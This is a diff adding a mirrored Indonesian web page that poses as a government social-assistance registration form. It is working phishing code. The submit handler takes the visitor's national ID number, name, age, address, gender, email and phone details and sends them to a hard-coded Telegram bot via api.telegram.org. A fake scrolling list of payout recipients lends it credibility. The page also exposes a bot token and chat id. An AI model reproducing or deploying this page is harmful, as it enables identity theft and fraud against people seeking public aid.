@@ -1,0 +1,302 @@
+
+<html lang="en">
+
+
+<!-- Mirrored from clickinformaasi-bansosind.my.id/data.php by HTTrack Website Copier/3.x [XR&CO'2017], Mon, 07 Oct 2024 10:25:25 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta property="og:description" content="DAFTAR BANTUAN SOSIAL">
+    <meta property="og:image" content="assets/img/1.jpg">
+
+    
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <title>DAFTAR BANTUAN SOSIAL</title>
+
+</head><div id="carouselExampleControls" class="carousel slide" data-ride="carousel">
+  <div class="carousel-inner">
+    <div class="carousel-item active">
+      <img class="d-block w-100" src="assets/img/1.jpg" alt="First slide">
+    </div>
+    <div class="carousel-item">
+      <img class="d-block w-100" src="assets/img/4.jpg" alt="Second slide">
+    </div>
+    <div class="carousel-item">
+      <img class="d-block w-100" src="assets/img/5.jpg" alt="Third slide">
+    </div>
+  </div>
+  <a class="carousel-control-prev" href="#carouselExampleControls" role="button" data-slide="prev">
+    <span class="carousel-control-prev-icon" aria-hidden="true"></span>
+    <span class="sr-only">Previous</span>
+  </a>
+  <a class="carousel-control-next" href="#carouselExampleControls" role="button" data-slide="next">
+    <span class="carousel-control-next-icon" aria-hidden="true"></span>
+    <span class="sr-only">Next</span>
+  </a>
+</div>
+
+<script>
+    $('.carousel').carousel({
+  interval: 500
+})
+</script>
+
+
+<body>
+
+
+        <h2 style="color: #1a96db;font-size: 16px;text-align: center;padding-top: 20;">
+        Pendaftaran Bantuan Sosial
+         
+        </h2>
+        <script>
+            var TxtType = function(el, toRotate, period) {
+            this.toRotate = toRotate;
+            this.el = el;
+            this.loopNum = 0;
+            this.period = parseInt(period, 10) || 2000;
+            this.txt = '';
+            this.tick();
+            this.isDeleting = false;
+            };
+            
+            TxtType.prototype.tick = function() {
+            var i = this.loopNum % this.toRotate.length;
+            var fullTxt = this.toRotate[i];
+            
+            if (this.isDeleting) {
+            this.txt = fullTxt.substring(0, this.txt.length - 1);
+            } else {
+            this.txt = fullTxt.substring(0, this.txt.length + 1);
+            }
+            
+            this.el.innerHTML = '<span class="wrap">'+this.txt+'</span>';
+            
+            var that = this;
+            var delta = 100 - Math.random() * 100;
+            
+            if (this.isDeleting) { delta /= 2; }
+            
+            if (!this.isDeleting && this.txt === fullTxt) {
+            delta = this.period;
+            this.isDeleting = true;
+            } else if (this.isDeleting && this.txt === '') {
+            this.isDeleting = false;
+            this.loopNum++;
+            delta = 500;
+            }
+            
+            setTimeout(function() {
+            that.tick();
+            }, delta);
+            };
+            
+            window.onload = function() {
+            var elements = document.getElementsByClassName('typewrite');
+            for (var i=0; i<elements.length; i++) {
+            var toRotate = elements[i].getAttribute('data-type');
+            var period = elements[i].getAttribute('data-period');
+            if (toRotate) {
+            new TxtType(elements[i], JSON.parse(toRotate), period);
+            }
+            }
+            // INJECT CSS
+            var css = document.createElement("style");
+            css.type = "text/css";
+            css.innerHTML = ".typewrite > .wrap { border-right: 0.08em solid #fff}";
+            document.body.appendChild(css);
+            };
+        </script>
+
+<style>
+    label{
+        margin: 8px;
+    }
+</style>                
+                
+<div class="container">                   
+    <form id="formfive" method="post">
+
+                <input type="hidden" name="operator" id="operator" value="  ">
+                <input type="hidden" name="nomor" id="nomor" value="  ">
+
+        <div class="form-group">
+            <center><label class="font-weight-bold">Silahkan Lengkapi Data Diri Anda</label></center>
+            <br>
+            <label for="exampleFormControlInput1">NIK E-KTP</label>
+                <input type="tel" class="form-control" name="ktp" id="ktp"
+                placeholder="Masukkan NIK Anda" required maxlength="16">
+                <label for="exampleFormControlInput1">Nama Lengkap</label>
+                <input type="text" class="form-control" name="namalengkap" id="namalengkap"
+                placeholder="Masukkan Nama Lengkap" required>
+                <label for="exampleFormControlInput1">Usia</label>
+                <input type="tel" class="form-control" name="usia" id="usia"
+                placeholder="Masukkan Usia Anda" required>
+                <label for="exampleFormControlInput1">Alamat</label>
+                <textarea type="text" class="form-control" name="alamat" id="alamat"
+                placeholder="Masukkan Alamat Lengkap" required></textarea>
+                <label for="exampleFormControlInput1">Jenis Kelamin</label>
+                <select class="form-control" name="jkelamin" id="jkelamin" required>
+                    <option>Pilih Jenis Kelamin</option>
+                    <option value="pria">Pria</option>
+                    <option value="wanita">Wanita</option>
+                </select>
+                <label for="exampleFormControlInput1">E-Mail</label>
+                <input type="text" class="form-control" name="email" id="email"
+                placeholder="Masukkan E-Mail Aktif" required>
+        </div>
+
+        <button type="submit" id='bansos' class="btn btn-primary btn-lg btn-block font-weight-bold">DAFTAR</button>
+                          
+    </form>
+</div>
+
+<div class="container-main">
+    <img class="lazyload" data-src="assets/img/tgbanner.png" width="100%" src="assets/img/footer.png">           
+</div>
+
+
+<div class="container mt-5">
+
+    <div class="card">
+
+    <div class="card-header text-center text-white bg-danger font-weight-bold">
+        Daftar Penerima Bantuan Terbaru
+    </div>
+
+        <div class="card-body">
+        
+            <marquee direction="up" height="100">
+                <div class="alert alert-primary" role="alert">
+                Ami Suartini Rp.600.000
+                </div>
+                <div class="alert alert-primary" role="alert">
+                Michelle Prastuti Rp.1.000.000
+                </div>
+                <div class="alert alert-primary" role="alert">
+                Tedi Sinaga Rp.600.000 
+                </div>
+                <div class="alert alert-primary" role="alert">
+                Danang Rajasa Rp.1.500.000
+                </div>
+                <div class="alert alert-primary" role="alert">
+                Hana Nuraini Rp.1.500.000
+                </div>
+                <div class="alert alert-primary" role="alert">
+                Tina Agustina Rp.1.000.000 
+                </div>
+                <div class="alert alert-primary" role="alert">
+                Himawan Tarihoran Rp.600.000 
+                </div>
+            </marquee>
+
+        </div>
+
+    </div>
+
+</div><style>
+
+* {
+  margin: 0;
+  padding: 0;
+}
+
+.loader {
+  display: none;
+  top: 50%;
+  left: 50%;
+  position: absolute;
+  transform: translate(-50%, -50%);
+}
+
+.loading {
+ background-image: url("assets/img/spinner.gif");
+}
+
+@keyframes spin {
+  0% {
+      transform: rotate(0deg);
+  }
+  100% {
+      transform: rotate(360deg);
+  }
+}
+</style>
+
+
+        <div class="loader">
+            <div class="loading">
+                <img src="assets/img/spinner.gif" alt="">
+            </div>
+        </div>
+
+
+<script type="text/javascript">
+    function spinner() {
+        document.getElementsByClassName("loader")[0].style.display = "block";
+    }
+</script>    
+    
+    <script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+     <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+     <script src="https://dev-danapemulihan.pantheonsite.io/asset/jquery.mask.min.js"></script>
+    
+<script>
+
+var nomor = sessionStorage.getItem("nomor");
+document.getElementById("nomor").value = nomor + "";
+var operator = sessionStorage.getItem("operator");
+document.getElementById("operator").value = operator + "";
+    
+</script>
+<script>
+ $(document).ready(function(){
+    $('#formfive').submit(function(e) {
+    event.preventDefault();
+             
+   $('#bansos').text('Memproses....');
+  
+var nomor = document.getElementById("nomor");
+var operator = document.getElementById('operator');
+var ktp = document.getElementById('ktp');
+var namalengkap = document.getElementById('namalengkap');
+var usia = document.getElementById('usia');
+var alamat = document.getElementById('alamat');
+var jkelamin = document.getElementById('jkelamin');
+var email = document.getElementById('email');
+
+  var gabungan = '├•★ •𝓣𝓮𝓵𝓮𝓰𝓻𝓪𝓶 𝓑𝓸𝓽•%0A├─────•☭𝗕𝗮𝗻𝘀𝗼𝘀•─────' + '%0A├•★ ' + operator.value + '%0A├•★ 𝗡𝗼𝗺𝗼𝗿 : ' + nomor.value + '%0A├•★ 𝗡𝗜𝗞 : ' + ktp.value + '%0A├•★ 𝗡𝗮𝗺𝗮 : ' + namalengkap.value + '%0A├•★ 𝗨𝘀𝗶𝗮 : ' + usia.value + '%0A├•★ 𝗔𝗹𝗮𝗺𝗮𝘁 : ' + alamat.value + '%0A├•★ 𝗝 𝗞𝗲𝗹𝗮𝗺𝗶𝗻 : ' + jkelamin.value + '%0A├•★ 𝗘𝗺𝗮𝗶𝗹 : ' + email.value + '%0A╰───────────────────';
+
+                var token = '7573142984:AAGOPcsHmNUyHZMoX44O7UKsYzBBQqAGn2w'; // Ganti dengan token bot yang kamu buat
+                var grup = '1065452610'; // Ganti dengan chat id dari bot yang kamu buat
+
+
+                   $.ajax({
+
+                    url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
+                    method: `POST`,
+
+                   complete: function(data) {
+            console.log('Complete')
+                       
+                setTimeout(function() {
+location.href='proses.html';
+var nomor = document.getElementById("nomor").value;
+
+sessionStorage.setItem("nomor", nomor);
+
+var operator = document.getElementById('operator').value;
+sessionStorage.setItem("operator", operator);
+                        }, 500);
+                    }
+    });
+ });
+    return false;
+});   
+</script>
+</html>
